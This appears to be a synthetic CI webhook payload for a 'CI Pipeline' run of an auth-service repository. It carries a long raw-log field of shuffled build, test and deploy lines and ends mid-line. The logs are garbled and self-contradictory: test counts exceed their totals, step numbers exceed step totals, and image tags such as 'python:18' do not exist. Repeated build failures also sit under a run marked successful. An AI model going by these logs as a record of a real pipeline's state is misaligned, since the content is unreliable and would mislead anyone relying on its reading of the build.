{
  "action": "completed",
  "workflow_run": {
    "id": 810,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "333ed807e2798efb2268b7af98a1a607935b4722",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-01T12:19:57.008554Z",
    "updated_at": "2025-12-01T12:22:31.427098Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: save_cache ===\nCompiling utils/index.js...\npip: Installing build dependencies...\nConnecting to test.io:443...\nnpm notice: package.json updated\nCache saved successfully\nCache miss for key-6422\nArtifact uploaded: build.tar.gz (6MB)\nVerifying...\nUsing Node.js 14.0.6\nPOST /api - 200 (170ms)\nCache invalidated: dependencies\nWARNING: jest has known vulnerabilities\nTest Suites: 6 passed, 17 total\nCache miss for key-1863\nTest Suites: 47 passed, 32 total\nMinifying main.js\nTLS handshake completed\nTests: 227 passed, 338 total\n[12:19:57] INFO: Cache refreshed\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\nUsing Node.js 14.1.2\nStep 20/19: Linting\nCompleted.\nReady.\nGET /status - 204 (25ms)\n[12:19:57] ERROR: Connection failed\nCompiling utils/utils.go...\nGET /health - 204 (87ms)\nSwitched to branch 'bugfix/task-845'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/main.py...\n[12:19:57] DEBUG: Query executed in 4ms\n[12:19:57] DEBUG: Query executed in 73ms\nArtifact uploaded: dist.zip (95MB)\nnpm install: added 367 packages\nCoverage: 79% statements, 90% branches\nBuilding Docker image...\n[12:19:57] DEBUG: Connection pool: 14 active\n\u2717 build failed with exit code 43\nStep 3/19: Installing dependencies\n[12:19:57] WARN: Deprecated API usage\nTime: 68.679s\n\u2717 build failed with exit code 63\n[12:19:57] WARN: Deprecated API usage\n\u2713 validate completed\nArtifact uploaded: build.tar.gz (50MB)\n[12:19:57] ERROR: Connection failed\nTest Suites: 24 passed, 43 total\nCreating production build...\nStep 2/20: Building\nChecking out master branch\nMinifying main.js\nOptimizing 81 modules...\n[12:19:57] WARN: Deprecated API usage\nUploading artifact 'dist' (5 files)\nStep 12/18: Building\nTransforming 254 files...\n[12:19:57] DEBUG: Query executed in 56ms\n\u2713 Task completed in 3855ms\nProcessing...\nArtifact downloaded: 37MB\nOptimizing 18 modules...\nException: ValueError\nCache restored successfully (155MB)\nStep 18/22: Building\n[12:19:57] INFO: Processing request\n[12:19:57] INFO: Processing request\nStep 17/19: Installing dependencies\nInstalling express@5.11.9\nFinished.\nyarn add: Done in 13.34s\npip: Installing build dependencies...\nStep 14/19: Testing\nEnvironment: test\nImage pulled successfully\nnpm notice: package.json updated\nSnapshots: 31 passed, 15 total\nRan 53 tests in 54s\nArtifact uploaded: dist.zip (91MB)\nStep 7/24: Building\n[12:19:57] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (1MB)\n\u2713 All checks passed\nCompleted.\nStep 1/15: Deploying\n[12:19:57] ERROR: Connection failed\npip install: Successfully installed webpack-5.2\nBuilding Docker image...\nFinished.\nOptimizing 14 modules...\n[12:19:57] WARN: Deprecated API usage\nnpm notice: created a lockfile\nFAILED: test_user_create\nBuilding Docker image...\n[12:19:57] INFO: Connecting to database\nSuccess!\nArtifact uploaded: build.tar.gz (38MB)\n[12:19:57] ERROR: Connection failed\nConnection established\nOK\nStep 16/25: Linting\nStep 8/25: Installing dependencies\nBuilding Docker image...\nPulling image: python:latest\nFAILED: test_user_create\nLoading...\nRan 66 tests in 17s\nOK\nPOST /upload - 200 (207ms)\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: integration/test_auth_login.spec.js\nSnapshots: 5 passed, 9 total\n\u2713 Step 'checkout' succeeded\nCompiling utils/main.py...\nCompiling components/index.js...\n[12:19:57] DEBUG: Memory usage: 124MB\nSnapshots: 48 passed, 30 total\n[12:19:57] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 Task completed in 2421ms\nCache restored successfully (228MB)\n[12:19:57] DEBUG: Initializing service\nPulling image: python:18\nWaiting...\n[12:19:57] DEBUG: Query executed in 30ms\nFAILED: test_auth_login\n  PASS: e2e/test_user_create.spec.js\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] WARN: Deprecated API usage\n[12:19:57] INFO: Connecting to database\nStep 18/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 Step 'setup' succeeded\nLayer 1/10: COPY command\nVerifying...\nStep 18/22: Deploying\nTest Suites: 26 passed, 22 total\nUploading artifact 'coverage' (5 files)\nCompiling lib/main.py...\n[12:19:57] DEBUG: Initializing service\n[12:19:57] INFO: Processing request\nStep 5/18: Installing dependencies\n[12:19:57] INFO: Processing request\n\u2713 deploy completed\n[12:19:57] DEBUG: Query executed in 55ms\nCache miss for key-4983\nConnection established\nWARNING: jest has known vulnerabilities\n[12:19:57] DEBUG: Connection pool: 1 active\nnpm install: added 432 packages\nSwitched to branch 'hotfix/task-613'\nConnecting to acme.corp:443...\nTest Suites: 41 passed, 22 total\nStep 10/22: Deploying\nStep 4/15: Building\nCompiling src/utils.go...\n[12:19:57] INFO: Cache refreshed\nFetching submodules...\n[12:19:57] WARN: Deprecated API usage\nCompiling utils/app.ts...\nCache saved successfully\n[12:19:57] INFO: Connecting to database\nEnvironment: staging\nStep 4/16: Linting\n[12:19:57] DEBUG: Initializing service\nCache restored successfully (104MB)\nWARNING: webpack has known vulnerabilities\nGET /status - 204 (65ms)\nArtifact uploaded: dist.zip (74MB)\nHEAD is now at c0fc0f5\n[12:19:57] WARN: Deprecated API usage\nFinished.\n[12:19:57] DEBUG: Loading configuration\n[12:19:57] DEBUG: Query executed in 71ms\nLoading...\nStep 5/22: Linting\nNODE_ENV=test\npip: Installing build dependencies...\nCache saved successfully\nyarn add: Done in 3.74s\nFetching submodules...\npip: Downloading jest-3.6.tar.gz\n  PASS: test_cache_hit (324ms)\nCoverage: 80% statements, 77% branches\nPulling image: python:3.11\nTest Suites: 30 passed, 16 total\nCache hit for key-3416\nArtifact uploaded: dist.zip (78MB)\n=== Step save_cache completed ===\n=== Step: deploy_production ===\nWARNING: axios has known vulnerabilities\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 103.907s\nnpm notice: package.json updated\nBundling runtime.js\n  PASS: test_db_connect (496ms)\nTest Suites: 32 passed, 34 total\nOK\nArtifact downloaded: 39MB\nNODE_ENV=production\nCompiling components/utils.go...\nCompiling components/utils.go...\nFetching submodules...\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading prettier-2.7.tar.gz\nyarn add: Done in 19.9s\nImage pulled successfully\nRan 104 tests in 21s\nPulling image: alpine:latest\n[12:19:57] DEBUG: Loading configuration\nBundling main.css\nCache restored successfully (167MB)\nConnecting to test.io:443...\nUsing Python 3.11\nBundling runtime.js\n[12:19:57] WARN: Deprecated API usage\nTLS handshake completed\nCompiling utils/main.py...\npip: Collecting prettier\n\u2713 Step 'install' succeeded\n[12:19:57] INFO: Request completed\nArtifact uploaded: dist.zip (79MB)\nCompiling utils/handler.rs...\n\u2717 build failed with exit code 10\nFinished.\nEnvironment: test\nCompiling components/index.js...\nOptimizing 32 modules...\n[12:19:57] INFO: Request completed\nWaiting...\nConnecting to cloud.services:443...\nStep 19/22: Installing dependencies\nnpm install: resolved 220 packages\nBuilding Docker image...\nVerifying...\nStep 18/22: Running migrations\nTransforming 904 files...\nArtifact downloaded: 9MB\n\u2713 Step 'build' succeeded\n\u2713 All checks passed\nCache hit for key-7861\nUsing Node.js 16.12.3\nGET /status - 201 (37ms)\nBuilding Docker image...\nnpm notice: created a lockfile\nWARNING: react has known vulnerabilities\nFetching submodules...\nTLS handshake completed\n[12:19:57] INFO: Request completed\nOK\nTLS handshake completed\nGET /api - 204 (71ms)\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2713 Step 'test' succeeded\nPlatform: win32-x64\nStep 16/22: Installing dependencies\nWaiting...\n[12:19:57] INFO: Processing request\nArtifact downloaded: 37MB\nBundling main.js\nCache miss for key-2095\nReady.\npip: Collecting express\nVerifying...\nStep 15/23: Testing\nnpm notice: package.json updated\nEnvironment: production\nPulling image: node:3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache saved successfully\n[12:19:57] WARN: Deprecated API usage\nTests: 479 passed, 347 total\nImage pulled successfully\nSnapshots: 9 passed, 33 total\n[12:19:57] INFO: Processing request\npip: Collecting eslint\nFetching submodules...\n\u2713 All checks passed\nBundling runtime.css\nArtifact uploaded: dist.zip (37MB)\nUploading artifact 'dist' (41 files)\nCompiling src/service.java...\nStep 18/22: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:57] DEBUG: Loading configuration\nnpm install: resolved 725 packages\nConnection established\nNODE_ENV=production\nGenerating source maps...\n\u2713 Task completed in 902ms\nCache restored successfully (387MB)\nMinifying main.js\nSwitched to branch 'bugfix/task-772'\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\nDone.\nUploading artifact 'build' (4 files)\nOptimizing 57 modules...\nBuilding Docker image...\nWARNING: express has known vulnerabilities\nCompiling components/app.ts...\n[12:19:57] INFO: Processing request\n[12:19:57] INFO: Request completed\npip install: Successfully installed axios-2.19\nVerifying...\nChecking out master branch\n[12:19:57] DEBUG: Connection pool: 7 active\nBuilding Docker image...\n[12:19:57] DEBUG: Memory usage: 1642MB\n[12:19:57] WARN: Deprecated API usage\nPlatform: linux-x64\nImage pulled successfully\nProcessing...\nFAILED: test_api_health\nOK\nBuilding Docker image...\n[12:19:57] INFO: Request completed\n  PASS: unit/test_api_health.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:57] INFO: Processing request\nSuccess!\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nPOST /api - 200 (48ms)\nCoverage: 73% statements, 85% branches\n[12:19:57] DEBUG: Memory usage: 492MB\nAlready up to date.\n\u2717 build failed with exit code 116\nFinished.\nHEAD is now at 5e4e9f7\nnpm install: added 152 packages\nMinifying app.js\nOptimizing 39 modules...\nUsing Node.js 15.20.9\nArtifact uploaded: dist.zip (12MB)\nCompiling components/index.js...\nWARNING: prettier has known vulnerabilities\nStep 11/24: Linting\n[12:19:57] DEBUG: Memory usage: 1705MB\nGET /api - 204 (54ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/service.java...\nCache invalidated: build\nBuilding Docker image...\n[12:19:57] INFO: Request completed\n[12:19:57] INFO: Cache refreshed\n\u2713 build completed\nTime: 108.7s\nCreating production build...\nUploading artifact 'coverage' (26 files)\nStep 2/18: Testing\nPulling image: alpine:18\nWaiting...\nCompiling src/handler.rs...\nBuilding Docker image...\nStep 9/18: Running migrations\nSuccess!\n  PASS: integration/test_db_connect.spec.js\nProcessing...\nConnecting to test.io:443...\n  PASS: test_db_connect (442ms)\n\u2713 lint completed\nTests: 393 passed, 380 total\n[12:19:57] DEBUG: Initializing service\nMinifying app.js\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:57] DEBUG: Query executed in 100ms\nnpm notice: package.json updated\nStep 3/19: Linting\n\u2713 Step 'install' succeeded\npip: Collecting eslint\nyarn add: Done in 30.33s\n[12:19:57] DEBUG: Connection pool: 20 active\nWARNING: axios has known vulnerabilities\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nTLS handshake completed\nWaiting...\nImage pulled successfully\npip install: Successfully installed webpack-4.1\nConnecting to acme.corp:443...\nnpm notice: created a lockfile\n\u2713 lint completed\n\u2713 Step 'build' succeeded\nUsing Python 3.12\nPushing to registry...\n[12:19:57] WARN: Deprecated API usage\nCompiling lib/main.py...\nnpm install: added 337 packages\nPushing to registry...\n[12:19:57] DEBUG: Connection pool: 6 active\nCache invalidated: dependencies\nPushing to registry...\nUploading artifact 'build' (9 files)\nPushing to registry...\nStep 11/17: Building\nStep 17/18: Linting\nNODE_ENV=development\nWARNING: react has known vulnerabilities\nTest Suites: 34 passed, 35 total\nCache miss for key-3347\nStep 11/20: Linting\nnpm install: added 320 packages\n\u2713 Task completed in 4161ms\nChecking out main branch\nPlatform: win32-x64\nImage pulled successfully\nInstalling lodash@3.13.7\nChecking out main branch\nnpm install: resolved 1142 packages\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: ValueError\nCache hit for key-1775\nFetching submodules...\nyarn add: Done in 8.98s\n\u2713 All checks passed\nUsing Node.js 15.16.0\nOptimizing 67 modules...\nStep 17/19: Linting\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (93MB)\n[12:19:57] INFO: Processing request\n[12:19:57] DEBUG: Connection pool: 6 active\n\u2717 build failed with exit code 105\n[12:19:57] ERROR: Connection failed\n\u2713 All checks passed\nNODE_ENV=development\nProcessing...\nUploading artifact 'coverage' (35 files)\nPlatform: darwin-arm64\n[12:19:57] ERROR: Connection failed\nStep 10/17: Linting\nChecking out main branch\n\u2713 All checks passed\npip: Downloading lodash-1.10.tar.gz\nBuilding Docker image...\nBuilding Docker image...\n\u2713 All checks passed\nGET /status - 200 (80ms)\nMinifying main.js\nGET /status - 201 (9ms)\nStep 10/23: Building\n[12:19:57] DEBUG: Query executed in 68ms\nTLS handshake completed\nException: TypeError\nPulling image: python:18\nSuccess!\nGET /health - 200 (85ms)\nFetching submodules...\nStep 17/18: Deploying\nPOST /data - 201 (257ms)\nStep 5/16: Running migrations\nGET /api - 200 (25ms)\n[12:19:57] DEBUG: Connection pool: 18 active\nReady.\nUsing Node.js 14.14.5\nFinished.\nArtifact uploaded: build.tar.gz (23MB)\nSnapshots: 34 passed, 16 total\nTests: 255 passed, 184 total\nWaiting...\n\u2713 test completed\nProcessing...\nPulling image: python:latest\nChecking out develop branch\nCompiling lib/service.java...\nPulling image: node:latest\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nChecking out main branch\n[12:19:57] INFO: Starting build process\nOK\nCompiling utils/utils.go...\nyarn add: Done in 11.10s\nFetching submodules...\nCache hit for key-2838\n[12:19:57] WARN: Deprecated API usage\nyarn add: Done in 30.66s\nDone.\nOK\npip: Downloading jest-3.6.tar.gz\nnpm install: added 481 packages\nSnapshots: 13 passed, 16 total\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling prettier@4.2.8\nCreating production build...\nWARNING: prettier has known vulnerabilities\nCoverage: 77% statements, 88% branches\nPlatform: darwin-arm64\nPushing to registry...\nCompiling components/index.js...\n[12:19:57] WARN: Deprecated API usage\nConnection established\nOK\nCompleted.\n  PASS: test_auth_login (269ms)\nArtifact downloaded: 3MB\nInstalling webpack@1.0.1\n\u2713 All checks passed\nnpm notice: package.json updated\nAlready up to date.\n\u2713 Task completed in 1853ms\nCache miss for key-6905\n\u2713 Task completed in 1935ms\n[12:19:57] DEBUG: Memory usage: 1161MB\nConnecting to cloud.services:443...\nyarn add: Done in 25.96s\nCompiling src/utils.go...\nMinifying vendor.js\nWARNING: webpack has known vulnerabilities\nTime: 43.690s\nAlready up to date.\nConnecting to startup.dev:443...\nCache restored successfully (149MB)\nUsing Python 3.10\nPlatform: linux-x64\nStep 19/20: Deploying\nyarn add: Done in 2.27s\nCache restored successfully (232MB)\nReady.\npip install: Successfully installed react-2.4\nOK\nAlready up to date.\nHEAD is now at 46167ae\n[12:19:57] INFO: Connecting to database\nnpm notice: created a lockfile\nLoading...\nPulling image: alpine:3.11\nyarn add: Done in 1.80s\nPlatform: win32-x64\n[12:19:57] INFO: Cache refreshed\npip: Downloading jest-2.12.tar.gz\nRan 81 tests in 8s\n[12:19:57] WARN: Deprecated API usage\nMinifying main.js\nChecking out develop branch\nTests: 132 passed, 242 total\nInstalling express@5.19.6\n[12:19:57] DEBUG: Loading configuration\n\u2713 Task completed in 2133ms\n[12:19:57] INFO: Request completed\n  PASS: e2e/test_user_create.spec.js\n[12:19:57] WARN: Deprecated API usage\nVerifying...\nHEAD is now at 5b0a73c\n[12:19:57] ERROR: Connection failed\nTransforming 726 files...\n\u2713 test completed\nWARNING: eslint has known vulnerabilities\nProcessing...\nnpm notice: created a lockfile\nCompiling src/service.java...\nStep 2/22: Building\nStep 17/25: Running migrations\nGET /status - 201 (8ms)\nWaiting...\nBundling runtime.css\nnpm install: resolved 906 packages\n[12:19:57] INFO: Starting build process\nWARNING: jest has known vulnerabilities\n  PASS: e2e/test_db_connect.spec.js\nBundling vendor.js\nWARNING: eslint has known vulnerabilities\nFetching submodules...\n=== Step unit_tests completed ===\n=== Step: checkout ===\nEnvironment: staging\nPushing to registry...\n[12:19:57] INFO: Connecting to database\nCompiling components/utils.go...\nBundling vendor.js\nyarn add: Done in 9.2s\nOptimizing 76 modules...\nUsing Node.js 17.2.9\nDone.\nCache restored successfully (137MB)\nCache invalidated: node_modules\nTest Suites: 32 passed, 42 total\n\u2717 build failed with exit code 57\n\u2713 Step 'setup' succeeded\nRan 163 tests in 32s\nEnvironment: staging\nWaiting...\nUsing Node.js 19.1.4\nCache hit for key-4455\nBundling styles.css\nProcessing...\nDone.\nCache miss for key-6541\nSuccess!\nArtifact downloaded: 21MB\nPlatform: darwin-arm64\n\u2713 All checks passed\n[12:19:57] INFO: Cache refreshed\nReady.\nLayer 10/13: COPY command\nDone.\n[12:19:57] DEBUG: Connection pool: 6 active\n[12:19:57] DEBUG: Memory usage: 1979MB\nHEAD is now at e86cf4a\n[12:19:57] DEBUG: Loading configuration\n[12:19:57] INFO: Request completed\nNODE_ENV=production\nTime: 2.33s\nPOST /upload - 200 (63ms)\nArtifact uploaded: dist.zip (46MB)\n[12:19:57] INFO: Cache refreshed\nnpm notice: created a lockfile\nTLS handshake completed\nMinifying vendor.js\n[12:19:57] INFO: Processing request\nFAILED: test_cache_hit\n\u2713 Task completed in 291ms\nChecking out develop branch\nBuilding Docker image...\n  PASS: test_auth_login (145ms)\nSuccess!\n[12:19:57] INFO: Connecting to database\nTest Suites: 15 passed, 30 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\nMinifying main.js\n[12:19:57] ERROR: Connection failed\nCompiling utils/app.ts...\nStep 5/21: Linting\nMinifying vendor.js\nBundling vendor.css\nnpm install: added 478 packages\nPushing to registry...\nReady.\nArtifact uploaded: dist.zip (74MB)\n[12:19:57] INFO: Processing request\nMinifying app.js\nRan 141 tests in 58s\n\u2713 Step 'test' succeeded\n\u2713 Task completed in 1116ms\nGET /api - 200 (71ms)\n\u2713 All checks passed\nArtifact downloaded: 20MB\nStep 10/22: Linting\nSnapshots: 4 passed, 25 total\nPOST /api - 202 (406ms)\nTransforming 571 files...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 43.230s\nWaiting...\nOptimizing 58 modules...\nWaiting...\nStep 6/15: Installing dependencies\nStep 1/17: Installing dependencies\n\u2713 Step 'build' succeeded\nSwitched to branch 'feature/task-190'\n[12:19:57] DEBUG: Memory usage: 239MB\n[12:19:57] ERROR: Connection failed\nChecking out master branch\n[12:19:57] INFO: Starting build process\nImage pulled successfully\nFinished.\n[12:19:57] DEBUG: Initializing service\n[12:19:57] DEBUG: Memory usage: 1149MB\nCache restored successfully (56MB)\nTests: 113 passed, 142 total\nCache invalidated: build\nStep 6/19: Building\n  PASS: test_cache_hit (433ms)\nRan 36 tests in 49s\nPOST /api - 202 (494ms)\nTLS handshake completed\nHEAD is now at 001027f\nWARNING: axios has known vulnerabilities\nSnapshots: 6 passed, 3 total\nPushing to registry...\nTest Suites: 43 passed, 42 total\n[12:19:57] INFO: Request completed\nyarn add: Done in 18.32s\n[12:19:57] DEBUG: Initializing service\nLoading...\nVerifying...\nCache invalidated: build\nStep 8/15: Deploying\nSnapshots: 42 passed, 34 total\nCompiling utils/app.ts...\n\u2713 package completed\nDone.\n[12:19:57] INFO: Cache refreshed\nCoverage: 82% statements, 65% branches\nStep 11/19: Running migrations\nBuilding Docker image...\nConnection established\nWARNING: axios has known vulnerabilities\nStep 8/21: Building\nVerifying...\nWaiting...\nPushing to registry...\nyarn add: Done in 20.97s\nWARNING: axios has known vulnerabilities\nStep 9/22: Running migrations\nStep 10/24: Testing\nWaiting...\n\u2717 build failed with exit code 15\nTests: 471 passed, 102 total\nCoverage: 99% statements, 66% branches\nInstalling jest@5.13.7\nConnecting to acme.corp:443...\nCache invalidated: build\nDone.\nUsing Node.js 20.6.8\n\u2713 Step 'install' succeeded\nCache invalidated: build\nLayer 5/10: COPY command\nRan 142 tests in 36s\nSnapshots: 27 passed, 35 total\nTransforming 189 files...\n[12:19:57] INFO: Connecting to database\n[12:19:57] INFO: Processing request\n[12:19:57] INFO: Processing request\npip: Installing build dependencies...\nStep 19/24: Deploying\nWARNING: lodash has known vulnerabilities\n  PASS: unit/test_api_health.spec.js\npip install: Successfully installed axios-5.9\nLayer 4/11: COPY command\n[12:19:57] DEBUG: Initializing service\n[12:19:57] DEBUG: Initializing service\nCompiling utils/service.java...\nVerifying...\nnpm notice: package.json updated\nCompiling utils/index.js...\nProcessing...\nTransforming 651 files...\nReady.\nCache invalidated: dependencies\nNODE_ENV=test\n\u2713 Step 'checkout' succeeded\nCompleted.\n[12:19:57] INFO: Cache refreshed\nCompiling components/app.ts...\nStep 19/21: Building\n\u2713 Step 'setup' succeeded\npip install: Successfully installed react-2.2\nArtifact uploaded: dist.zip (22MB)\nUsing Python 3.9\nArtifact downloaded: 44MB\nEnvironment: development\nnpm notice: created a lockfile\nCache invalidated: build\nException: RuntimeError\n[12:19:57] DEBUG: Connection pool: 6 active\nWaiting...\nNODE_ENV=production\nRan 103 tests in 8s\nCoverage: 91% statements, 79% branches\n[12:19:57] INFO: Cache refreshed\nUploading artifact 'dist' (45 files)\nVerifying...\n=== Step checkout completed ===\n=== Step: build ===\nCoverage: 84% statements, 97% branches\nTest Suites: 8 passed, 27 total\nCompleted.\nHEAD is now at a36d40e\nSwitched to branch 'hotfix/task-649'\n[12:19:57] ERROR: Connection failed\n[12:19:57] DEBUG: Initializing service\nCompiling utils/handler.rs...\nUsing Python 3.9\nArtifact downloaded: 47MB\nCompiling utils/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:57] DEBUG: Connection pool: 3 active\nCreating production build...\nnpm install: resolved 1285 packages\nStep 14/15: Building\n[12:19:57] INFO: Processing request\nPOST /data - 201 (466ms)\nFAILED: test_auth_login\npip: Installing build dependencies...\nCompiling components/index.js...\n[12:19:57] WARN: Deprecated API usage\nnpm install: resolved 480 packages\nUsing Python 3.9\nnpm install: resolved 1713 packages\nFetching submodules...\nUsing Python 3.10\nStep 20/19: Deploying\nSwitched to branch 'hotfix/task-772'\nEnvironment: test\n[12:19:57] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 14.54s\nOptimizing 27 modules...\n[12:19:57] WARN: Deprecated API usage\nTest Suites: 49 passed, 30 total\nUploading artifact 'dist' (22 files)\nRan 62 tests in 23s\nTLS handshake completed\nnpm install: resolved 1583 packages\nSnapshots: 37 passed, 8 total\nWARNING: axios has known vulnerabilities\nAlready up to date.\nTests: 347 passed, 196 total\nMinifying vendor.js\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 7/15: Installing dependencies\nOptimizing 52 modules...\nTime: 13.216s\nStep 13/21: Running migrations\nTest Suites: 45 passed, 46 total\nCache miss for key-6420\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Installing build dependencies...\nBuilding Docker image...\nStep 18/19: Building\nConnection established\nUsing Node.js 17.6.5\nyarn add: Done in 24.99s\n\u2713 Task completed in 738ms\nLoading...\nImage pulled successfully\nProcessing...\nEnvironment: staging\n[12:19:57] INFO: Request completed\n[12:19:57] INFO: Connecting to database\nDone.\nPushing to registry...\nnpm install: added 134 packages\nCoverage: 99% statements, 77% branches\nHEAD is now at 6267efe\nnpm install: added 215 packages\nArtifact uploaded: dist.zip (4MB)\n[12:19:57] DEBUG: Connection pool: 8 active\nRan 156 tests in 17s\n[12:19:57] WARN: Deprecated API usage\nCreating production build...\n  PASS: unit/test_cache_hit.spec.js\nCoverage: 91% statements, 77% branches\nStep 1/16: Building\n[12:19:57] DEBUG: Memory usage: 495MB\nArtifact uploaded: build.tar.gz (29MB)\nTime: 36.309s\nStep 1/16: Running migrations\n\u2713 Task completed in 4074ms\nEnvironment: staging\npip install: Successfully installed lodash-2.16\n[12:19:57] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (43MB)\nPOST /data - 201 (171ms)\nInstalling express@4.6.2\n\u2717 build failed with exit code 127\nTLS handshake completed\nCompiling utils/main.py...\nCompiling lib/app.ts...\n[12:19:57] INFO: Connecting to database\n\u2713 deploy completed\nGenerating source maps...\nCache restored successfully (223MB)\nVerifying...\n[12:19:57] ERROR: Connection failed\n\u2713 Task completed in 516ms\nFetching submodules...\nCompiling components/handler.rs...\n[12:19:57] DEBUG: Loading configuration\nStep 7/20: Building\nReady.\nConnection established\nSnapshots: 28 passed, 28 total\n[12:19:57] DEBUG: Memory usage: 1134MB\nNODE_ENV=development\n\u2713 Step 'setup' succeeded\n[12:19:57] INFO: Cache refreshed\nImage pulled successfully\n[12:19:57] DEBUG: Loading configuration\nStep 19/23: Deploying\nPOST /api - 202 (71ms)\n\u2713 Step 'test' succeeded\nCreating production build...\n[12:19:57] INFO: Starting build process\nBundling runtime.css\nCache restored successfully (82MB)\n\u2713 Step 'test' succeeded\n[12:19:57] DEBUG: Memory usage: 1127MB\nFAILED: test_user_create\n[12:19:57] INFO: Cache refreshed\nCompiling components/handler.rs...\nCoverage: 74% statements, 69% branches\npip: Installing build dependencies...\nCache restored successfully (303MB)\nCache miss for key-4745\nStep 11/22: Building\nRan 57 tests in 1s\nFAILED: test_user_create\nTime: 116.313s\nTest Suites: 22 passed, 31 total\nAlready up to date.\nyarn add: Done in 14.10s\nnpm notice: package.json updated\nCompiling src/utils.go...\nTime: 90.972s\nPOST /data - 202 (243ms)\nHEAD is now at f6f033d\nFinished.\n[12:19:57] INFO: Request completed\nCache restored successfully (482MB)\nStep 17/15: Running migrations\nOptimizing 91 modules...\nEnvironment: production\nGenerating source maps...\nCache miss for key-8631\nCompleted.\nAlready up to date.\nStep 5/18: Installing dependencies\nUploading artifact 'dist' (21 files)\nWARNING: jest has known vulnerabilities\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache saved successfully\n\u2713 package completed\nWARNING: eslint has known vulnerabilities\nStep 17/15: Deploying\nConnecting to acme.corp:443...\nGenerating source maps...\nCompleted.\nHEAD is now at 62f2c21\n\u2713 deploy completed\nGET /api - 200 (54ms)\nInstalling axios@2.13.2\n\u2713 Task completed in 271ms\nGET /api - 200 (42ms)\nReady.\nnpm notice: package.json updated\n[12:19:57] ERROR: Connection failed\nDone.\n\u2713 test completed\nFAILED: test_db_connect\n[12:19:57] DEBUG: Memory usage: 977MB\nArtifact downloaded: 14MB\nException: TypeError\nPushing to registry...\nnpm install: resolved 374 packages\nTest Suites: 49 passed, 35 total\nOK\nPulling image: alpine:latest\n\u2717 build failed with exit code 45\nWARNING: react has known vulnerabilities\n=== Step build completed ===\n=== Step: type_check ===\nStep 20/18: Running migrations\nRan 34 tests in 2s\nCache invalidated: node_modules\nGET /api - 201 (59ms)\n[12:19:57] INFO: Starting build process\n[12:19:57] DEBUG: Query executed in 5ms\nStep 4/20: Linting\nAlready up to date.\nArtifact uploaded: build.tar.gz (30MB)\nMinifying vendor.js\nMinifying app.js\nCache hit for key-6596\nSnapshots: 47 passed, 15 total\n[12:19:57] DEBUG: Connection pool: 7 active\nCache invalidated: dependencies\nAlready up to date.\nTime: 88.129s\nCoverage: 99% statements, 63% branches\nStep 19/20: Linting\n[12:19:57] INFO: Processing request\nDone.\nReady.\n[12:19:57] INFO: Request completed\nTests: 364 passed, 357 total\n\u2717 build failed with exit code 42\nCache miss for key-1813\nUploading artifact 'build' (33 files)\nProcessing...\nSnapshots: 17 passed, 10 total\nCreating production build...\npip: Installing build dependencies...\nNODE_ENV=test\nTransforming 493 files...\nTest Suites: 40 passed, 19 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at 7cf67a1\nAlready up to date.\n[12:19:57] INFO: Cache refreshed\nLayer 7/13: COPY command\n[12:19:57] INFO: Cache refreshed\nDone.\nGET /health - 200 (16ms)\nNODE_ENV=production\n  PASS: test_auth_login (474ms)\n\u2713 build completed\nTests: 130 passed, 454 total\n\u2713 All checks passed\n[12:19:57] INFO: Starting build process\npip: Collecting react\nCache hit for key-1883\nBundling main.css\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUploading artifact 'build' (40 files)\nnpm notice: created a lockfile\npip install: Successfully installed eslint-1.17\n\u2713 Step 'install' succeeded\nDone.\nReady.\nCompiling utils/app.ts...\n[12:19:57] INFO: Request completed\nTests: 331 passed, 484 total\npip install: Successfully installed react-3.12\nProcessing...\n[12:19:57] ERROR: Connection failed\nBundling main.js\n[12:19:57] DEBUG: Connection pool: 9 active\nStep 9/22: Testing\nStep 9/17: Testing\nCache invalidated: build\nLoading...\nMinifying app.js\nBuilding Docker image...\nCache invalidated: node_modules\n[12:19:57] DEBUG: Memory usage: 425MB\nArtifact downloaded: 15MB\npip: Installing build dependencies...\n  PASS: test_auth_login (262ms)\nCache saved successfully\n[12:19:57] DEBUG: Loading configuration\nCompleted.\npip: Installing build dependencies...\nOK\nWARNING: react has known vulnerabilities\nPulling image: alpine:18\nVerifying...\nSwitched to branch 